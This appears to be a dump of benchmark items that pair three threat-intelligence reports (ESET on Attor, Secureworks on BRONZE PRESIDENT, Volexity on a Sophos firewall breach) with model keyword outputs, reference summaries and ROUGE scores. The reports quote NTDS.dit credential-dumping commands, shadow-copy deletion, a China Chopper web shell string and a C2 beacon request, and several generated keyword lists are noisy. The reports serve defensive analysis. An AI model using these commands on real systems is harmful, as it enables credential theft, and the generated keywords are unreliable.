e8av4RKt26mXwWglm0znmWuGEGsrsmbBNjWJgl5jI2qb0hcMtLPc4LV/ngz8KWbE qxwPfnFYrhhYgCgFjWbJ1A8azRyOYWLo7qhFYeO+Fmvb480/9lZ4hYEhPRzKL3nW -----END PUBLIC KEY-----26-----BEGIN PUBLIC KEY----- -----END PUBLIC KEY----------BEGIN PUBLIC KEY----- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvg5VRwJbmGuWCjGKBJFE KBGdvXxdak4HnUzf+YiQmeqCeJVeR0fimcpf+Mvs1kKMT6LEpqzI3GknQca8V0Y+ vHe22NOZYqAVmHVZWgtg9Le2tOCqBLaTeRHO3SejzT3fwxcWshpvOM1QSXx6WP5V OlNw3XqOM7D1t/MZwo4hi+RaqQPgPLWXigtqDoQuuv/tP7vGOiKfVpjv6oQ4AlAX yTauktpktB4Q51nmm3hxy/pET2WjXpwPOXrl+Cpny5lZC44KRKvX8yume97zXZpg gf8rebKSvwipIIRVeD0ihpazjQ9V8AzPSYpbmk8oF8TUB/hFyYWQRq8+hKZ6IlKC wwIDAQAB -----END PUBLIC KEY----------BEGIN PUBLIC KEY----- x1cUWFcN2mSKCMHeJpdBPCEM7CwBjGjp9euSG+ZpvpOobvv/eggUVa68wm2HfNAk +WkpR/XKyOCBOQ7UzU7nHXka7MmdDLNuKrH+CSMGEK1VIuz6CjMPJkAwGpL1r1g3 a7nr4ihoLO2+r/dZUXgf7oyPLQdUiPH4I8eCzJVCMLi7kD7AqHvyOF/F9yYJ9DKO LEZrxG5wDnTKM+3Iwti6ULqCQwd/krlcSZkm+kwxN5htMwk2chmEONS6y7fwcMLW LwIDAQAB -----END PUBLIC KEY----------BEGIN PUBLIC KEY----- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA4rdRiBiEW7RKi+nGuQkQ zzy6B5M1patDsz8CplezC5ML4TGVjzU1IVpe/qzVoaYoDH5snjRuzcTWc4+BZlE3 wnzK/EItumjT9wuMcngHggG1T5hjgZQoLjVhAJ8zyNOmcVNsL9/DSUf1zg5SdGjv DV5/xFQGFeKegFKcZLukKA3et8y92NS2KLzQj3SIJVxFrSOK+rGfwy0pkr6qW00a TQIDAQAB -----END PUBLIC KEY-----27Applications targeted by Screengrabber pluginProcess name substrings: &RQ, 7ZFM, 7ZG, AGENTVKONTAKTE, AVANT, BROSIX, BROWSER, CHEAPVOIP, CHROME, DRAGON, EXCEL, FACEBOOKVIDEOCALLING, FINEREADER, FIREFOX, FIREFOXPORTABLE, FLOCK, GAJIM, GGAPP, HAMSTERARC, ICQ, IEXPLORE, INFIUM, LF30, MAGENT, MAXTHON, MIRANDA32, MOZILLA, MSIMN, MSMSGS, MSNMSGR, MULTIFON, MYIE, NERO, NICHROME, NIMBUZZ, NONOH, NOTEPAD, NOTEPAD++, OOVOO, OPERA, OUTLOOK, PGPKEYS, PGPTOOLS, PIDGIN, PIDGIN-PORTABLE, POWERPNT, PSI, PUFF, QIP, QQ, QUTIM, R&Q, RUN, SAFARI, SEAMONKEY, SKYPE, TBB-FIREFOX, TEAMVIEWER, THEBAT, THUNDERBIRD, TRILLIAN, TRUECRYPT, TWEETDECK, TWITTER-WIN8, VIBER, VISIO, W8VK, WEBMONEY, WINMAIL, WINRAR, WINWORD, WINZIP32, WLMAIL, WORDPAD, WUALA, WWAHOST, X-LITE, YAHOOM, YAHOOMESSENGERWindow title substrings: ************, AOL MAIL, ATTACHMENT .GOOGLE, BLOGGER, BLOGSPOT, DEPOSIT FILES, FACEBOOK, FROMRU, GMAIL, GOOGLE+, HIDE MY ASS!, HIDEMYASS .COM, HOTBOX, HOTMAIL, HUSHMAIL, IMO, LIVEJOURNAL, MAIL .RU, MAIL .YANDEX, MESSENGER, MICROSOFT EXCEL WEB APP, MICROSOFT ONENOTE WEB APP, MICROSOFT POWERPOINT WEB APP, MICROSOFT WORD WEB APP, MSN, POCHTA, RAMBLER, RAPIDSHARE, SKYDRIVE, SKYPE, TURBOBIT, TWITTER, WEBMAIL, YAHOO! MAIL, \u0412\u0410\u041c \u0421\u041e\u041e\u0411\u0429\u0415\u041d\u0418\u0415, \u041e\u0414\u041d\u041e\u041a\u041b\u0410\u0421\u0421\u041d\u0418\u041a\u0418, \u041f\u0420\u0418\u0413\u041b\u0410\u0428\u0415\u041d\u0418\u0415 \u0414\u0420\u0423\u0416\u0418\u0422\u042c, \u042f\u041d\u0414\u0415\u041a\u0421 .\u041f\u041e\u0427\u0422\u04107 MITRE ATT&CK TECHNIQUESTacticIDNameDescriptionT1106Execution through APIAttor\u2019s dispatcher uses CreateProcessW API for execution .T1129Execution through Module LoadAttor\u2019s dispatcher executes additional plugins by loading the respective DLLs .ExecutionT1085Rundll32Plugin 0x10 schedules rundll32.exe to load the dispatcher .T1053Scheduled TaskPlugin 0x10 schedules rundll32.exe to be executed on each boot/logon, and subsequently to load the dispatcher .T1035Service ExecutionAttor\u2019s dispatcher can be executed as a service .T1037Logon ScriptsPersistenceT1050New ServiceAttor\u2019s dispatcher can establish persistence via adding a Registry key with a logon script: HKEY_CURRENT_USER\\Environment\u201cUserInitMprLogonScript\u201dAttor\u2019s dispatcher can establish persistence by registering a new service .HKEY_LOCAL_MACHINE\\SYSTEM\\*ControlSet*\\Control\\SafeBoot\\ Minimal registry keys are updated to execute the service even in Safe mode and Safe mode with networking .T1053Scheduled TaskPlugin 0x10 schedules a new task that loads the dispatcher on boot/logon .28TacticIDNameDescriptionDefense EvasionT1140Deobfuscate/Decode Files or InformationStrings are encrypted with a XOR cipher, using a hardcoded key .Configuration data, log files and plugins are encrypted using a hybrid encryption scheme \u2013 Blowfish-OFB combined with RSA .T1107File DeletionThe collected files and log files are deleted after exfiltration by plugin 0x05 .T1158Hidden Files and DirectoriesThe attributes of log files and directories are set to HIDDEN/SYSTEM/ ARCHIVE (or combination of those) .T1036MasqueradingAttor\u2019s dispatcher disguises itself as a legitimate task (i .e ., the task name and description appear legitimate) .T1112Modify RegistryAttor\u2019s dispatcher can modify the Run registry key .T1055Process InjectionT1108Redundant AccessT1099TimestompT1497Virtualization/Sandbox EvasionAttor\u2019s dispatcher injects itself into running processes, to gain higher privileges and to evade detection . It avoids specific system and Symantec processes .Both 32-bit and 64-bit versions of Attor\u2019s dispatcher are executed; also they are injected into almost all processes .There is a watchdog component, implemented in the dispatcher or as a separate plugin, that reinstalls Attor if it has been removed .The time of last access to files and registry keys is manipulated after they have been created/modified .Attor can detect whether it is executed in some virtualized or emulated environments . If detected, it terminates itself immediately .Credential AccessT1056Input CaptureUser credentials can be collected by plugin 0x07 via capturing keystrokes .T1083File and Directory DiscoveryDiscoveryT1120Peripheral Device DiscoveryPlugin 0x01 enumerates files with specific extensions on all hard disk drives and stores file information in encrypted log files .Plugin 0x01 collects information about inserted storage devices, modems and phone devices .T1082System Information DiscoveryAttor monitors the free disk space on the system .T1123Audio CapturePlugin 0x03 is capable of recording audio using available input sound devices .T1119Automated CollectionAttor automatically collects data about the compromised system .T1115Clipboard DataCollectionPlugin 0x07 collects data stored in the Windows clipboard by using the OpenClipboard and GetClipboardData APIs .T1074Data StagedCollected data is staged in a central upload directory prior to exfiltration .T1056Input CapturePlugin 0x07 captures keystrokes pressed within the window of the process where Attor is injected .T1113Screen CapturePlugin 0x02 captures screenshots of target applications .29TacticIDNameDescriptionT1043Commonly Used PortAttor uses port 21 for C&C communication .T1188Multi-hop ProxyAttor uses Tor for C&C communication .Command and ControlT1079Multilayer EncryptionAttor sends encrypted traffic using Tor, which itself uses multiple layers of encryption .T1105Remote File CopyAttor can download additional plugins, updates and other files .T1071Standard Application Layer ProtocolFTP protocol is used for C&C communication .T1032Standard Cryptographic ProtocolA combination of Blowfish-OFB and RSA is used for data encryption .T1020Automated ExfiltrationExfiltration of the collected data and log files is done automatically by plugin 0x05 .ExfiltrationT1022Data EncryptedAttor encrypts data with a combination of Blowfish and RSA ciphers before sending it to the C&C server .T1041Exfiltration Over Command and Control ChannelAttor exfiltrates data over the C&C channel .ABOUT ESET For 30 years, ESET\u00ae has been developing industry-leading IT security software and services for businesses and consumers worldwide . With solutions ranging from endpoint and mobile security, to encryption and two-factor authentication, ESET\u2019s high-performing, easy-to-use products give consumers and businesses the peace of mind to enjoy the full potential of their technology . ESET unobtrusively protects and monitors 24/7, updating defenses in real time to keep users safe and businesses running without interruption . Evolving threats require an evolving IT security company . Backed by R&D centers worldwide, ESET becomes the first IT security company to earn 100 Virus Bulletin VB100 awards, identifying every single \u201cin-the-wild\u201d malware without interruption since 2003 . For more information, visit www .eset .com or follow us on LinkedIn, Facebook and Twitter . ", "generated_text": "a cyberespionage platform; at least 2013; diplomatic missions; governmental institutions; Eastern Europe; Eastern Europe; the malware; USB; fingerprint GSM devices; commands; a command set; persistence; control; commands; a plugin; port; IP; the software; persistence; the attackers; a simple command; IP; the espionage campaign.", "ref_text": "<START-1>Here is a summary of the key points from the PDF: The PDF describes a sophisticated cyberespionage malware platform called Attor that has been active since at least 2013. Attor uses a modular architecture consisting of a main dispatcher DLL and numerous loadable plugins that provide various capabilities. The plugins are customized for individual targets and synchronized using shared folders. It uses TOR for command and control communication to remain anonymous and untraceable. Network functionality is distributed across multiple components to make analysis difficult. Attor has plugins for persistence, device monitoring, screen/audio capturing, keylogging, file collection, exfiltration etc. A notable plugin fingerprints GSM devices using AT commands to gather subscriber details. The malware employs various encryption schemes and anti-analysis techniques. It avoids suspicious processes and restores file timestamps to stay undetected. Attor has targeted diplomatic missions and governments mainly in Russia and Eastern Europe. Infection vectors are unknown but it can monitor browsers, emails, messaging apps indicating spearphishing. The report provides in-depth technical analysis of the dispatcher component and the various plugins. It outlines Attor's evasion capabilities, command and control communication, and custom encryption schemes. Indicators of compromise and MITRE ATT&CK techniques are provided. The report concludes Attor is a professionally developed, customizable malware platform for long term infiltration of high-value targets. <END-1>", "t5/keyword/hint_hit_precision": 0.34782608695652173, "t5/word/hint_hit_recall": 0.06132075471698113, "gpt3/lexical/rouge_rouge1": 0.3543543543543544, "gpt3/lexical/rouge_rouge2": 0.1148036253776435, "gpt3/lexical/rouge_rougeL": 0.1981981981981982, "gpt3/lexical/rouge_rougeLsum": 0.1981981981981982, "gpt3_generated_text": ["ESET researchers have discovered a cyberespionage platform named Attor, which has been used in targeted attacks since at least 2013. This platform specifically targets diplomatic missions and governmental institutions in Eastern Europe. Attor utilizes a complex modular architecture, with a unique plugin that can fingerprint GSM devices using AT commands. The malware communicates with its FTP C&C server through Tor for anonymity. The platform allows attackers to customize capabilities on a per-victim basis, including persistence and spying capabilities. The espionage campaign has been active in two waves, with different implementations and changes in architecture. The malware may have been in use for years before being detected, with fake timestamp information in the samples."]}, {"split_name": "val", "sample_id": "val_47", "prompt_text": "Extract the keywords: 1/6/2020BRONZE PRESIDENT Targets NGOs | SecureworksBRONZE PRESIDENT Targets NGOssecureworks.com/research/bronze-president-targets-ngosSummary The activities of some non-governmental organizations (NGOs) challenge governments on politically sensitive issues such as social, humanitarian, and environmental policies. As a result, these organizations are often exposed to increased government-directed threats aimed at monitoring their activities, discrediting their work, or stealing their intellectual property. BRONZE PRESIDENT is a likely People's Republic of China (PRC)-based targeted cyberespionage group that uses both proprietary and publicly available tools to target NGO networks. Secureworks\u00ae Counter Threat Unit\u2122 (CTU) researchers have observed BRONZE PRESIDENT activity since mid-2018 but identi\ufb01ed artifacts suggesting that the threat actors may have been conducting network intrusions as far back as 2014.CTU\u2122 researchers divided the threat intelligence about this threat group into two sections: strategic and tactical. Executives can use the strategic assessment of the ongoing threat to determine how to reduce risk to their organization's mission and critical assets. Computer network defenders can use the tactical information gathered from incident response investigations and research to reduce the time and effort associated with responding to the threat group's activities. Key pointsThe BRONZE PRESIDENT cyberespionage group targets NGOs, as well as political and law enforcement organizations in countries in South and East Asia. The threat group appears to have developed its own remote access tools that it uses alongside publicly available remote access and post-compromise toolsets. After compromising a network, the threat actors elevate their privileges and install malware on a large proportion of systems. The group runs custom batch scripts to collect speci\ufb01c \ufb01le types and takes proactive steps to minimize detection of its activities.Strategic threat intelligence Analysis of a threat group's targeting, origin, and competencies can determine which organizations could be at risk. This information can help organizations make strategic defensive decisions in relation to the BRONZE PRESIDENT threat group. Intent CTU researchers have observed BRONZE PRESIDENT targeting multiple NGOs. The threat actors steal data from compromised systems over a long period of time, which likely indicates a long-term objective of monitoring the target's network. BRONZE PRESIDENT uses custom batch scripts to collect either speci\ufb01c \ufb01le types (including \ufb01les with .pptx, .xlsx, .pdf extensions) or allurl PRESIDENT Targets NGOs | Secureworks\ufb01les within a speci\ufb01c location. CTU researchers also observed evidence that the threat actors collect credentials from high-privilege network accounts and reputationally sensitive accounts, such as social media and webmail accounts.Additionally, CTU researchers have observed evidence of BRONZE PRESIDENT targeting political and law enforcement organizations in countries adjacent to the PRC, including Mongolia and India. Some of the group's phishing lures suggest an interest in national security, humanitarian, and law enforcement organizations in the East, South, and Southeast Asia (see Figure 1). These examples reveal BRONZE PRESIDENT's likely intent to conduct political espionage in other countries in addition to targeting NGOs.Figure 1. August 2019 phishing lure referencing Mongolian national security topics. (Source: It is highly likely that BRONZE PRESIDENT is based in the PRC due to the following observations:url PRESIDENT Targets NGOs | SecureworksThe NGOs targeted by BRONZE PRESIDENT conduct research on issues relevant to the PRC. Strong evidence links BRONZE PRESIDENT's infrastructure to entities within the PRC. There are connections between a subset of the group's operational infrastructure and PRC- based Internet service providers. Tools such as PlugX have historically been leveraged by threat groups operating in the PRC.It is likely that BRONZE PRESIDENT is sponsored or at least tolerated by the PRC government. The threat group's systemic long-term targeting of NGO and political networks does not align with patriotic or criminal threat groups. Capability BRONZE PRESIDENT has deployed a variety of remote access tools. The use of tools not previously observed by CTU researchers suggests that the group could have access to malware development capabilities. BRONZE PRESIDENT also uses widely available or modi\ufb01ed open- source tools, which could be a strategic effort to reduce the risk of attribution or to minimize the need for tool development resources. Following a network compromise, the threat actors typically delete their tools and processes. However, the group is content leaving some malware on the network, likely to provide a contingency if other access channels are removed. When the group's activities were detected in one incident, it had elevated privileges and had maintained access to the targeted environment for several months. This \ufb01nding indicates the group's effectiveness at maintaining long-term access to a targeted network. Tactical threat intelligence Incident response engagements have given CTU researchers insight into the threat group's tools CTU researchers and Secureworks incident responders have observed BRONZE PRESIDENT using the following tools, along with several custom batch scripts for locating and archiving speci\ufb01c \ufb01le types:Cobalt Strike \u2014 This popular and commercially available penetration tool gains shell access to an infected system. It allows threat actors to execute additional tools and perform post-intrusion actions on compromised systems. Cobalt Strike appears to be one of BRONZE PRESIDENT's preferred remote access tools. During one intrusion, the threat actors installed it on over 70% of accessible hosts. The group's Cobalt Strike installation typically uses a payload named svchost.exe in an attempt to disguise Cobalt Strike activity as the legitimate Windows svchost.exe executable.url PRESIDENT Targets NGOs | SecureworksPlugX \u2014 This remote access trojan (RAT) is popular among PRC-based targeted threat groups. Its functionality includes uploading and downloading \ufb01les, and it has con\ufb01gurable network protocols. BRONZE PRESIDENT installs PlugX using DLL side-loading. In June and August 2019, BRONZE PRESIDENT delivered PlugX via government and law enforcement-themed phishing lures. ORat \u2014 CTU researchers have only observed this basic loader tool in the context of BRONZE PRESIDENT intrusions. ORat is the name assigned by the malware author, as denoted by the program debug database string in the analyzed sample: D:\\vswork\\Plugin\\ORat\\build\\Release\\ORatServer\\Loader.pdb. The tool uses the Windows Management Instrumentation (WMI) event consumer for persistence by installing a script to the system's WMI registry. Messages sent from ORat to its command and control (C2) server start with the string \"VIEWS0018x\". If the data received from the C2 server starts with the same string, then the remainder of the payload is decompressed using ORat's \"de\ufb02ate\" algorithm and called as a function. ORat acts as a \ufb02exible loader tool rather than a fully featured remote access tool. RCSession \u2014 This basic RAT is installed via DLL side-loading, and CTU researchers observed BRONZE PRESIDENT installing it on multiple hosts during intrusions. RCSession was extracted from a \ufb01le called English.rtf and launched via a hollowed svchost.exe process. RCSession connects to its C2 server via a custom protocol, can remotely execute commands, and can launch additional tools. CTU researchers have no evidence of other threat actors using RCSession or of wide proliferation of the tool, suggesting it may be exclusively used by BRONZE PRESIDENT. Nbtscan \u2014 This publicly available command-line tool scans systems for NetBIOS name information (see Figure 2). In an example observed by CTU researchers, the Nbtscan executable was named Adobe.exe and was installed in several working directories on compromised hosts, including: C:\\Recovery\\.Figure 2. Nbtscan being used via RCSession to scan an internal IP range. (Source: Secureworks) Nmap \u2014 BRONZE PRESIDENT used this freely available network scanning tool from the C:\\PerfLogs\\ folder. Wmiexec \u2014 This publicly available tool uses WMI to create SYSTEM-level shells on remote hosts.Links to other malware While analyzing hosts compromised by BRONZE PRESIDENT, CTU researchers identi\ufb01ed other malware artifacts. Although there was no evidence of the group using the malware, the threat actors may have leveraged its access or capabilities during earlier phases of the intrusions. Theurl PRESIDENT Targets NGOs | SecureworksBRONZE PRESIDENT intrusions observed by CTU researchers appear to have taken place over several months or years.China Chopper web shell \ufb01les named error404.aspx included the \"eval(Request.Item[\"|\"],\"unsafe\");\" string. To successfully interact with the web shell, a threat actor sent HTTP requests that included the \"|\" parameter. The web shell \ufb01les appeared to be installed during the timeframe that BRONZE PRESIDENT was active on the system (see Figure 3).Figure 3. Timeline of malicious tool use on a compromised host. (Source: Secureworks)CTU researchers identi\ufb01ed a variety of post-compromise tools stored under %AppData% (e.g., \\AppData\\Roaming\\Temp) on several compromised systems. The widespread proliferation and use of the following tools suggest that the group likely has the knowledge and capability to use them as part of its operations:Powerview.ps1 \u2014 This PowerShell-based module for network reconnaissance is part of the PowerSploit penetration testing framework. PVE Find AD User \u2014 This command-line tool identi\ufb01es login locations of Active Directory (AD) users. AdFind \u2014 This command-line tool conducts AD queries. NetSess \u2014 This publicly available tool enumerates NetBIOS sessions. Netview \u2014 This tool enumerates networks. TeamViewer \u2014 This remote control and desktop-sharing tool has applications for legitimate and malicious system users. Its installation in a temporary directory alongside network reconnaissance and enumeration tools likely indicates malicious intent.Initial access and working directories At the time of detection, observed BRONZE PRESIDENT incidents had likely been ongoing for several months or even years. As a result, CTU researchers were unable to ascertain the initial access vector. In October 2019, third-party researchers described a phishing campaign that usedurl PRESIDENT Targets NGOs | SecureworksC2 infrastructure that CTU researchers attribute to BRONZE PRESIDENT. This connection suggests that the group uses phishing emails with ZIP attachments that contain LNK \ufb01les as an initial access vector.During one intrusion, the threat actors gained administrator access to all systems within a targeted business unit and installed their remote access tools on 80% of the hosts. The group installed multiple tools within the environment, including three different tools on a strategically important server, likely to provide contingency access options (see Table 1).Cobalt Strike RCSession ORat Host 1 (Server) Host 2 (User PC) X Host 3 (User PC) X Host 4 (User PC) Host 5 (User PC) Host 6 (User PC) X Host 7 (User PC) XX XXTable 1. Remote access tools identi\ufb01ed on infected hosts during a BRONZE PRESIDENT intrusion.BRONZE PRESIDENT used multiple directories to install tools on compromised hosts (see Table 2).Associated tool C:\\Windows\\Help\\Help\\ C:\\Windows\\debug\\WIA\\ Cobalt Strike C:\\Windows\\Logs\\DPX\\ NbtscanTable 2. Directories used by BRONZE PRESIDENT to execute or store tools. Network enumeration, lateral movement, and credential accessurl PRESIDENT Targets NGOs | SecureworksDuring multiple intrusions, the threat actors employed various tools and techniques to understand the network environments. For example, they used Nmap to scan various internal IP address ranges and SMB ports (see Figure 4). They also relied on Nbtscan, net user, and ping commands to obtain insights and identify opportunities for lateral movement.Figure 4. Nmap network scanning tool use via RCSession. (Source: Secureworks)BRONZE PRESIDENT regularly leverages Wmiexec to move laterally. During one intrusion, the threat actors extensively used this tool to execute WMI commands on remote hosts in the environment (see Figure 5).Figure 5. Wmiexec used to execute commands on a targeted host. (Source: Secureworks)They also frequently leverage net commands to connect to other hosts (see Figure 6) using compromised credentials collected during early phases of the intrusion.Figure 6. BRONZE PRESIDENT Nbtscan use and net commands. (Source: Secureworks)During one intrusion observed by CTU researchers, the group used the native vssadmin tool on a domain controller to create a volume shadow copy:vssadmin create shadow /for=c:The threat actors retrieved the NTDS.dit \ufb01le from the volume shadow copy. NTDS.dit contains Active Directory data, including password hashes for all users on a domain. Extracting hashes from the NTDS.dit \ufb01le requires access to the SYSTEM \ufb01le in the system registry:reg save hklm\\system c:\\windows\\temp\\system.hiveurl PRESIDENT Targets NGOs | SecureworksThe threat actors saved both the SYSTEM \ufb01le (system.hive) and NTDS.dit in the compromised host's c:\\windows\\temp directory. These \ufb01les were likely ex\ufb01ltrated and exploited of\ufb02ine to retrieve user password hashes, which could then be cracked or used to perform pass-the-hash attacks. C2 communications and infrastructure BRONZE PRESIDENT's C2 techniques are dictated by its remote access tools. The group's primary and likely proprietary RCSession RAT communicates with a hard-coded C2 server using a custom protocol over TCP port 443. After connecting to its C2 server, RCSession checks in with an encrypted beacon and then awaits instruction. The ORat tool, which appears to be used less frequently by the group, communicates over TCP port 80 using a raw socket protocol (not HTTP).The Cobalt Strike tool has malleable C2 pro\ufb01les. During one intrusion, it connected to multiple C2 domains on TCP port 80, including mail . svrchost . com, using the following request. Subsequent Cobalt Strike C2 servers included subdomains of svchosts . com, svrchost . com, and strust . club.GET /Dv9i HTTP/1.1 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0) Host: mail . svrchost . com Connection: Keep-Alive Cache-Control: no-cacheSome BRONZE PRESIDENT C2 domains analyzed by CTU researchers were hosted on infrastructure owned by Dutch VPS provider Host Sailor, Hong Kong-based New World Telecoms, and Malaysia-based Shinjiru Technology (see Figure 7). The threat actors have used discrete infrastructure clusters that share matching hosting and registration characteristics. The pattern of infrastructure hosting suggests that the group parks its domains when not in use, an operational security technique that limits exposure of the group's overall hosting infrastructure.Figure 7. Hosting for a subset of BRONZE PRESIDENT C2 domains. (Source: Secureworks)url PRESIDENT Targets NGOs | SecureworksPersistence, defensive evasion, and ex\ufb01ltration Some of BRONZE PRESIDENT's malware has persistence capabilities. For example, ORat uses a WMI event consumer to maintain its presence on a compromised host. The group also creates and maintains scheduled tasks to achieve this purpose. Figure 8 shows a Sysdriver scheduled task that periodically executes a Cobalt Strike payload.Figure 8. BRONZE PRESIDENT scheduled task created for Cobalt Strike persistence. (Source: Secureworks)The threat actors tend to install malware on a large proportion of hosts during their intrusions. However, the group exercises restraint and defensive evasion tactics to minimize opportunities for network defenders to detect or investigate its activities. For example, the threat actors deleted volume shadow copies after using them for NTDS.dit retrieval:vssadmin delete shadows /for=c: /quietLikewise, the group demonstrated diligence by killing local and remote processes after they had been used:taskkill /im svchosts.exe /Ftaskkill /S <REMOTE SYSTEM NAME> /U <USERNAME> /P <PASSWORD> /im svchost.exeBRONZE PRESIDENT targets speci\ufb01c data types. The threat actors use custom batch scripts to create a list of \ufb01les with prede\ufb01ned criteria and collate the identi\ufb01ed \ufb01les into a .rar archive (see Figure 9). CTU researchers have observed BRONZE PRESIDENT batch scripts named doc.bat, xls.bat, xlsx.bat, ppt.bat, pptx.bat, pdf.bat, and txt.bat.url PRESIDENT Targets NGOs | SecureworksFigure 9. Batch script (pptx.bat) used to collate and archive all .pptx \ufb01les in a de\ufb01ned location. (Source: Secureworks)The group also uses the all.bat batch script to collect all \ufb01les stored on a speci\ufb01c user's desktop. CTU researchers observed RCSession and Cobalt Strike on systems that BRONZE PRESIDENT targeted for data theft. Either of these tools could have been used to ex\ufb01ltrate the archived data. Conclusion BRONZE PRESIDENT has demonstrated intent to steal data from organizations using tools such as Cobalt Strike, PlugX, ORat, and RCSession. The concurrent use of so many tools during a single intrusion suggests that the group could include threat actors with distinct tactics, roles, and tool preferences. It is likely that BRONZE PRESIDENT has additional unobserved operational tools and capabilities. CTU researchers recommend that organizations apply controls to mitigate common intrusion techniques and behaviors along with controls that address the tools and techniques discussed in this analysis. Threat indicators The threat indicators in Table 3 are associated with BRONZE PRESIDENT threat campaigns. Note that IP addresses can be reallocated. The IP address and domains may contain malicious content, so consider the risks before opening them in a browser.Indicator PlugX C2 serverurl PRESIDENT Targets NGOs | SecureworksIndicator RCSession C2 serverORat and Cobalt Strike C2 server Cobalt Strike C2 server Cobalt Strike C2 server Cobalt Strike down\u2010 load location Used by BRONZE PRESIDENT to check a compromised sys\u2010 tem's connectivity Linked to BRONZE Linked to BRONZE Linked to BRONZE sampleCobalt Strike payloadCobalt Strike payloadurl PRESIDENT Targets NGOs | SecureworksIndicator Cobalt Strike payloadCobalt Strike payloadCobalt Strike payloadCobalt Strike payloadCobalt Strike payloadModi\ufb01ed DLL \ufb01le (goopdate.dll) used by BRONZE PRESI\u2010 DENT to install RCSession Modi\ufb01ed DLL \ufb01le (goopdate.dll) used by BRONZE PRESI\u2010 DENT to install RCSession Modi\ufb01ed DLL \ufb01le (goopdate.dll) used by BRONZE PRESI\u2010 DENT to install Modi\ufb01ed DLL \ufb01le (goopdate.dll) used by BRONZE PRESI\u2010 DENT to install RCSessionurl PRESIDENT Targets NGOs | SecureworksIndicator NATIONAL SECURITY CONCEPT OF Modi\ufb01ed DLL \ufb01le (goopdate.dll) used by BRONZE PRESI\u2010 DENT to install RCSession Modi\ufb01ed DLL \ufb01le (goopdate.dll) used by BRONZE PRESI\u2010 DENT to install DENT phishing lure DENT phishing lure DENT phishing lure DENT phishing lure DENT phishing lure delivering PlugXurl PRESIDENT Targets NGOs | SecureworksIndicator DENT phishing lure DENT phishing lure DENT phishing lure DENT phishing lure DENT phishing lure DENT phishing lure delivering PlugXTable 3. BRONZE PRESIDENT indicators.url ", "generated_text": "NAT; BRONZE PRESIDENT; Chinese; PRC; NGOs; South; East Asia; the threat actors; custom batch scripts; files;.pptx;.xlsx; all; systems; privileges; custom batch scripts; custom file types; Prev; results; analysis; threats; infrastructure; links; government; PlugX; access; malware development capabilities; attribution; the use; tools; infrastructure; infrastructure; Gmail; phishing lures; NGOs; organizations; South; Southeast Asia; India; Mongolia; India; information; infrastructure; threat intelligence.", "ref_text": "<START-1>The PDF details the activities of a likely China-based cyberespionage threat group named BRONZE PRESIDENT that targets non-governmental organizations (NGOs), political groups, and law enforcement agencies, primarily in South and East Asia. The group has been active since at least 2014 and uses a variety of custom and publicly available hacking tools to compromise target networks and steal sensitive data. BRONZE PRESIDENT's custom tools include ORat, RCSession, and modified DLL files, while they also leverage Cobalt Strike, PlugX, WMI, and more. BRONZE PRESIDENT uses multiple directories to install tools on compromised hosts and employs various tools and techniques during multiple intrusions to understand network environments. The group gains initial access through phishing and then moves laterally across networks, collects credentials, elevates privileges, and installs tools on a large number of systems. They are adept at maintaining long-term access and have diligent operational security procedures. Some of BRONZE PRESIDENT's malware has persistence capabilities, such as using a WMI event consumer to maintain its presence on a compromised host and creating scheduled tasks to achieve this purpose. Researchers detail BRONZE PRESIDENT's tactics, malware, infrastructure, targeting, and provide indicators of compromise to help network defenders combat this threat. The report concludes that organizations should apply controls to mitigate common intrusion techniques the group leverages. <END-1>", "t5/keyword/hint_hit_precision": 0.3181818181818182, "t5/word/hint_hit_recall": 0.07582938388625593, "gpt3/lexical/rouge_rouge1": 0.39296187683284456, "gpt3/lexical/rouge_rouge2": 0.10029498525073748, "gpt3/lexical/rouge_rougeL": 0.25806451612903225, "gpt3/lexical/rouge_rougeLsum": 0.25806451612903225, "gpt3_generated_text": ["The article discusses the cyberespionage activities of the BRONZE PRESIDENT group, a likely Chinese-based threat group targeting NGOs, political, and law enforcement organizations in South and East Asia. The threat actors use custom batch scripts to collect specific file types and credentials from high-privilege accounts. Evidence suggests that BRONZE PRESIDENT is linked to the Chinese government, with infrastructure connections to PRC-based entities. The group displays advanced capabilities, deploying various remote access tools, including PlugX. They delete tools post-compromise but leave some malware for future access. Their intent appears to be long-term monitoring of networks, including political espionage in neighboring countries. This information is crucial for organizations to make strategic defensive decisions against the ongoing threat posed by BRONZE PRESIDENT."]}, {"split_name": "val", "sample_id": "val_48", "prompt_text": "Extract the keywords: www.volexity.com /blog/2022/06/15/driftingcloud-zero-day-sophos-firewall-exploitation-and-an-insidious-breach/ DriftingCloud: Zero-Day Sophos Firewall Exploitation and an Insidious BreachJune 15, 2022by Steven Adair, Thomas Lancaster, Volexity Threat ResearchVolexity frequently works with individuals and organizations heavily targeted by sophisticated, motivated, and well- equipped threat actors from around the world. Some of these individuals or organizations are attacked infrequently or on an irregular basis, while others see a barrage of attacks nearly every week. Regardless of the attack frequency, Volexity keeps its guard up, looking for new and old threats however they manifest themselves.Earlier this year, Volexity detected a sophisticated attack against a customer that is heavily targeted by multiple Chinese advanced persistent threat (APT) groups. This particular attack leveraged a zero-day exploit to compromise the customer's firewall. Volexity observed the attacker implement an interesting webshell backdoor, create a secondary form of persistence, and ultimately launch attacks against the customer's staff. These attacks aimed to further breach cloud-hosted web servers hosting the organization's public-facing websites. This type of attack is rare and difficult to detect. This blog post serves to share what highly targeted organizations are up against and ways to defend against attacks of this nature.Note that the vulnerability discussed in this article was resolved by Sophos on the 25th March 2022 as indiciated in this advisory. Detecting a Firewall BreachOn March 8, 2022, through its Network Security Monitoring service, Volexity detected anomalous activity emanating from a customer's Sophos Firewall. Volexity received alerts from custom signatures it had deployed that immediately put the device under suspicion of being compromised. This led to a forensic investigation where Volexity acquired memory, selective files, and disk images from the Sophos Firewall. Analysis of the data led to the discovery of a backdoor on the firewall, as well as evidence of exploitation dating back to March 5, 2022. Volexity\u2019s investigation further expanded once it discovered the attacker was using access to the firewall to conduct man-in-the-middle (MITM) attacks. The attacker used data collected from these MITM attacks to compromise additional systems outside of the network where the firewall resided.After Volexity\u2019s investigation, Sophos published an advisory on March 25, 2022, describing a remote code execution (RCE) vulnerability (submitted by a third-party) in its firewalls covered by CVE-2022-1040. Volexity believes this is the same vulnerability exploited in its investigation, as the customer's firewall was up to date and met the criteria for remote exploitation. Volexity attributes these attacks to a Chinese APT group previously reported to Volexity Threat Intelligence customers under the name \"DriftingCloud\". (Note: The information in this post was available to Volexity 